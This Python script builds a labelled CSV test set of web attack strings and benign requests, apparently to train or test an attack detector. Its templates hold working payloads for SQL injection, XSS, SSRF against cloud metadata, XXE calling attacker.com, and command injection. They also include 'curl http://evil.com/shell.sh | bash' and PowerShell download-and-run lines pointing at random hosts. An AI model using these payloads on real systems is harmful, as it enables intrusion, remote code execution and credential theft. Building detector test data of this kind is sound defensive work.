import pandas as pd
import random
import uuid
import urllib.parse

random.seed(42)

def generate_sqli(n):
    templates = [
        "admin' OR {var1}={var1}--",
        "' UNION SELECT {var2}, {var3} FROM {table}--",
        "1; DROP TABLE {table};--",
        "SELECT * FROM {table} WHERE {col} = '{val}' OR 1=1",
        "'; EXEC xp_cmdshell('ping 127.0.0.1');--",
        "admin' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--",
        "1' WAITFOR DELAY '0:0:{time}'--",
        "1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version())))"
    ]
    tables = ["users", "accounts", "admin_users", "employees", "credentials", "billing"]
    cols = ["id", "email", "username", "password", "session_id"]
    payloads = set()
    while len(payloads) < n:
        t = random.choice(templates)
        p = t.format(
            var1=random.randint(1, 10000),
            var2=random.choice(cols),
            var3=random.choice(cols),
            table=random.choice(tables),
            col=random.choice(cols),
            val=uuid.uuid4().hex[:8],
            time=random.randint(5, 15)
        )
        payloads.add(p)
    return list(payloads)

def generate_xss(n):
    templates = [
        "<script>alert('{msg}')</script>",
        "<img src=x onerror=alert('{msg}')>",
        "javascript:alert('{msg}')",
        "<svg onload=alert('{msg}')>",
        "<body onload=alert('{msg}')>",
        "<iframe src=\"javascript:alert('{msg}')\">",
        "\"><script>prompt('{msg}')</script>",
        "'-alert('{msg}')-'"
    ]
    payloads = set()
    while len(payloads) < n:
        msg = uuid.uuid4().hex[:8]
        payloads.add(random.choice(templates).format(msg=msg))
    return list(payloads)

def generate_path_traversal(n):
    templates = [
        "{dots}/etc/passwd{rnd}",
        "{dots}/Windows/System32/drivers/etc/hosts{rnd}",
        "{dots}/etc/shadow{rnd}",
        "{dots}/var/log/apache2/access.log{rnd}",
        "{dots}/boot.ini{rnd}"
    ]
    payloads = set()
    while len(payloads) < n:
        depth = random.randint(3, 15)
        dot_style = random.choice(["../", "..\\", "%2e%2e%2f", "%2e%2e/", "..%2f"])
        dots = dot_style * depth
        rnd = "%00" + uuid.uuid4().hex[:4] if random.random() > 0.5 else ""
        payloads.add(random.choice(templates).format(dots=dots, rnd=rnd))
    return list(payloads)

def generate_ssrf(n):
    templates = [
        "http://169.254.169.254/latest/meta-data/{aws_path}",
        "http://localhost:{port}/admin?id={uid}",
        "http://127.0.0.1:{port}/server-status?v={uid}",
        "file:///etc/{file}?uid={uid}",
        "gopher://localhost:{port}/_flushall?{uid}",
        "dict://localhost:{port}/info?{uid}"
    ]
    aws_paths = ["iam/security-credentials/", "hostname", "local-ipv4", f"test-{uuid.uuid4().hex[:4]}"]
    files = ["passwd", "hosts", "shadow", "hostname"]
    payloads = set()
    while len(payloads) < n:
        payloads.add(random.choice(templates).format(
            aws_path=random.choice(aws_paths) + uuid.uuid4().hex[:4],
            port=random.randint(1000, 9999),
            file=random.choice(files),
            uid=uuid.uuid4().hex[:6]
        ))
    return list(payloads)

def generate_cmd_injection(n):
    templates = [
        "; {cmd} -c {num} {uid}",
        "| {cmd} {arg} {uid}",
        "`{cmd} {arg} {uid}`",
        "$({cmd} {arg} {uid})",
        "& {cmd} {arg} {uid}",
        "&& {cmd} {arg} {uid}"
    ]
    cmds = ["cat", "ls", "whoami", "id", "ping", "netstat", "ifconfig"]
    args = ["/etc/passwd", "-la", "-n 5 127.0.0.1", "-an", "-a"]
    payloads = set()
    while len(payloads) < n:
        payloads.add(random.choice(templates).format(
            cmd=random.choice(cmds),
            num=random.randint(1, 100),
            arg=random.choice(args),
            uid=uuid.uuid4().hex[:4]
        ))
    return list(payloads)

def generate_xxe(n):
    templates = [
        "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY {ent} SYSTEM \"file://{file}\"> ]><data>&{ent};{uid}</data>",
        "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{domain}/evil.dtd\"> %xxe;]><!-- {uid} -->",
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://{domain}/test'>]><root>&test; {uid}</root>"
    ]
    domains = [f"{uuid.uuid4().hex[:8]}.attacker.com" for _ in range(20)]
    files = ["/etc/passwd", "/etc/shadow", "c:/windows/win.ini", "/proc/self/environ"]
    payloads = set()
    while len(payloads) < n:
        payloads.add(random.choice(templates).format(
            ent=f"e{random.randint(1, 999)}",
            file=random.choice(files),
            domain=random.choice(domains),
            uid=uuid.uuid4().hex[:6]
        ))
    return list(payloads)

def generate_ldap(n):
    templates = [
        "*)(uid={uid}))(|(uid=*",
        "admin)(!({attr}=*{uid}))",
        "admin)(|({attr}={uid}*))",
        "*)({attr}=*{val}*",
        "*)({attr}={uid}*)"
    ]
    attrs = ["userPassword", "description", "uid", "cn", "mail"]
    payloads = set()
    while len(payloads) < n:
        payloads.add(random.choice(templates).format(
            attr=random.choice(attrs),
            val=uuid.uuid4().hex[:4],
            uid=uuid.uuid4().hex[:6]
        ))
    return list(payloads)

def generate_nosql(n):
    templates = [
        '{{"{field}": {{"$gt": "{val}"}}, "uid": "{uid}"}}',
        '{{"{field}": {{"$ne": "{val}"}}, "id": "{uid}"}}',
        '{{"$where": "this.{field} == \'{val}\' // {uid}"}}',
        '"{field}": {{"$regex": ".*{uid}.*"}}',
        '{{"$or": [{{"{field}": "{val}"}}, {{"{field}": {{"$ne": null}}}}], "uid": "{uid}"}}'
    ]
    fields = ["username", "password", "role", "email"]
    payloads = set()
    while len(payloads) < n:
        payloads.add(random.choice(templates).format(
            field=random.choice(fields),
            val=random.choice(["", "admin", "1", uuid.uuid4().hex[:6]]),
            uid=uuid.uuid4().hex[:8]
        ))
    return list(payloads)

def generate_fileupload(n):
    templates = [
        "filename=\"{name}.php.jpg\"",
        "filename=\"{name}.asp;_{name}.jpg\"",
        "filename=\"{name}.php%00.png\"",
        "filename=\"{name}.phtml\"",
        "filename=\"{name}.jsp%00.pdf\""
    ]
    payloads = set()
    while len(payloads) < n:
        payloads.add(random.choice(templates).format(
            name=uuid.uuid4().hex[:10]
        ))
    return list(payloads)

def generate_bruteforce(n):
    payloads = set()
    while len(payloads) < n:
        uid = uuid.uuid4().hex[:6]
        payloads.add(f"POST /login HTTP/1.1\nHost: example.com\n\nusername=admin&password=pass{uid}")
    return list(payloads)

def generate_credentialstuffing(n):
    payloads = set()
    while len(payloads) < n:
        uid = uuid.uuid4().hex[:8]
        payloads.add(f"POST /api/auth HTTP/1.1\n\n{{\"email\": \"user{uid}@leak.com\", \"password\": \"{uid}123!\"}}")
    return list(payloads)

def generate_csrf(n):
    templates = [
        "<form action=\"http://example.com/api/{action}\" method=\"POST\"><input type=\"hidden\" name=\"{param}\" value=\"{val}\"></form><script>document.forms[0].submit()</script>",
        "<img src=\"http://example.com/api/{action}?{param}={val}\">"
    ]
    actions = ["transfer", "changePassword", "updateEmail", "deleteAccount"]
    params = ["amount", "new_pass", "email", "id"]
    payloads = set()
    while len(payloads) < n:
        payloads.add(random.choice(templates).format(
            action=random.choice(actions),
            param=random.choice(params),
            val=uuid.uuid4().hex[:10]
        ))
    return list(payloads)

def generate_rce(n):
    templates = [
        "<?php system('{cmd}'); // {uid} ?>",
        "eval(base64_decode('{b64}')); // {uid}",
        "Runtime.getRuntime().exec(\"{cmd}\"); // {uid}",
        "require('child_process').exec('{cmd}'); // {uid}",
        "os.system('{cmd}') # {uid}"
    ]
    cmds = ["id", "whoami", "cat /etc/passwd", "curl http://evil.com/shell.sh | bash"]
    payloads = set()
    while len(payloads) < n:
        cmd = random.choice(cmds)
        import base64
        b64 = base64.b64encode(cmd.encode()).decode()
        payloads.add(random.choice(templates).format(cmd=cmd, b64=b64, uid=uuid.uuid4().hex[:6]))
    return list(payloads)

def generate_malware(n):
    templates = [
        "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -EncodedCommand {enc}",
        "cmd.exe /c start /MIN powershell -ep bypass -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://{domain}/payload.ps1')\"",
        "Invoke-WebRequest -Uri http://{domain}/malware.exe -OutFile C:\\Windows\\Temp\\{file}.exe; Start-Process C:\\Windows\\Temp\\{file}.exe"
    ]
    domains = [f"{uuid.uuid4().hex[:8]}.ru", f"{uuid.uuid4().hex[:6]}.cn", "pastebin.com/raw/xyz"]
    payloads = set()
    while len(payloads) < n:
        enc = uuid.uuid4().hex.upper() * 4
        payloads.add(random.choice(templates).format(
            enc=enc,
            domain=random.choice(domains),
            file=uuid.uuid4().hex[:8]
        ))
    return list(payloads)

def generate_benign(n):
    templates = [
        "GET /api/v1/{endpoint}?id={id} HTTP/1.1",
        "POST /users/profile HTTP/1.1\n\n{{\"name\": \"{name}\", \"age\": {age}}}",
        "GET /static/images/{img}.png HTTP/1.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    ]
    endpoints = ["products", "articles", "news", "catalog", "items"]
    names = ["John", "Alice", "Bob", "Emma", "David"]
    payloads = set()
    while len(payloads) < n:
        payloads.add(random.choice(templates).format(
            endpoint=random.choice(endpoints),
            id=random.randint(1, 1000000),
            name=random.choice(names) + str(random.randint(1,999)),
            age=random.randint(18, 65),
            img=uuid.uuid4().hex[:12],
            ver=random.randint(90, 120)
        ))
    return list(payloads)

def main():
    print("Generating unseen payloads...")
    data = []
    
    generators = {
        "SQL_Injection": (200, generate_sqli),
        "XSS": (200, generate_xss),
        "PathTraversal": (200, generate_path_traversal),
        "SSRF": (200, generate_ssrf),
        "Command_Injection": (200, generate_cmd_injection),
        "XXE": (200, generate_xxe),
        "LDAP_Injection": (200, generate_ldap),
        "NoSQL_Injection": (200, generate_nosql),
        "FileUpload_Attack": (200, generate_fileupload),
        "BruteForce": (200, generate_bruteforce),
        "CredentialStuffing": (200, generate_credentialstuffing),
        "CSRF": (200, generate_csrf),
        "RCE": (200, generate_rce),
        "Malware": (200, generate_malware),
        "Benign": (500, generate_benign)
    }

    for label, (count, gen_func) in generators.items():
        payloads = gen_func(count)
        for p in payloads:
            data.append({"text": p, "label": label})
        print(f"Generated {len(payloads)} {label} payloads.")

    df = pd.DataFrame(data)
    
    # Shuffle dataset
    df = df.sample(frac=1, random_state=42).reset_index(drop=True)
    
    df.to_csv("test_dataset.csv", index=False)
    print(f"\\nSuccessfully generated test_dataset.csv with {len(df)} samples.")

if __name__ == "__main__":
    main()
